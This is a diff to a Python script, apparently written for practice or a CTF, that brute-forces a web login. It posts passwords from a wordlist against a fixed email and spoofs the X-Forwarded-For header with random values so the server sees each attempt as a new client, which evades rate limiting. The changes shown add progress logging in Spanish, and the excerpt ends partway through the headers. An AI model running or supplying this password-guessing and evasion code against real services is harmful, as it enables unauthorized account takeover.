@@ -3,19 +3,23 @@
 
 
 from pwn import *
-import requests
-import random
+import requests, random , time
 main_url = "" #endpoint
 email = "planbkid@gmail.com"
 
 def bruteforce():
     f = open("wordlist.txt","r")
+    p1 = log.progress("Fuerza Bruta")
+    p1.status("Iniciando Fuerza Bruta")
+
+    time.sleep(3)
 
     for password in f.readlines(): #funcion para leer linea por linea el archivo
         post_data = {
             "email": email,
             "password": password.strip()
         }
+        p1.status(f'Probando contraseñas {post_data["password"]}')
 
         headers = {
              'X-Forwarded_For': str(random.randint(1,100))#esta cabezera hace que el servidor detras de la pagina web crea que cada
